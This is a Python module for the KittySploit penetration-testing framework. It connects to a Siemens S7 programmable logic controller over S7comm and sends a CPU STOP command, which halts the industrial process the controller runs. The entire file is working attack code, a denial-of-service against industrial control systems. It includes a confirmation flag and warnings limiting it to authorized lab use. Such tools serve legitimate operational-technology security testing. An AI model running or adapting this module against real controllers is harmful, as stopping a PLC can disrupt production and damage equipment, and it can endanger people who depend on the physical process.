#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.ics.constants import ICS_PROTOCOL_PORTS
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client
from lib.protocols.ics.s7_client import S7Client


class Module(Auxiliary, Ics_scanner_client):
    __info__ = {
        "name": "S7 CPU STOP",
        "description": (
            "Sends a STOP command to a Siemens S7 PLC CPU. This halts the running process "
            "and is extremely disruptive — lab use only with explicit authorization."
        ),
        "author": "KittySploit Team",
        "platform": Platform.OTHER,
        "tags": ["ics", "siemens", "s7comm", "stop", "dos", "plc"],
        "agent": {
            "risk": "intrusive",
            "effects": ["denial_of_service"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
        },
    }

    port = OptPort(ICS_PROTOCOL_PORTS["s7comm"], "S7comm port", True)
    rack = OptInteger(0, "PLC rack number", False)
    slot = OptInteger(1, "PLC slot number", False)
    password = OptString("", "Optional S7 session password", False)
    confirm = OptBool(False, "Confirm intentional CPU STOP", True)

    def check(self):
        host = self._host()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        if not bool(self.confirm):
            return {
                "vulnerable": False,
                "reason": "set confirm=true to acknowledge CPU STOP",
                "confidence": "high",
            }
        if not self.is_tcp_open():
            return {"vulnerable": False, "reason": "TCP 102 closed", "confidence": "high"}
        return {"vulnerable": True, "reason": "S7comm port open", "confidence": "low"}

    def run(self):
        host = self._host()
        if not host:
            print_error("Target is required")
            return False
        if not bool(self.confirm):
            print_error("Refusing to STOP CPU without confirm=true")
            return False

        print_warning("CPU STOP is destructive — authorized OT lab use only")
        client = S7Client(
            host,
            self._port(),
            self._timeout(),
            int(self.rack or 0),
            int(self.slot or 1),
            str(self.password or ""),
        )
        if not client.connect():
            print_error("S7comm connection failed")
            return False
        try:
            if client.cpu_stop():
                print_success(f"CPU STOP command sent to {host}:{self._port()}")
                return True
            print_error("CPU STOP failed — install python-snap7 for full CPU control")
            return False
        finally:
            client.close()
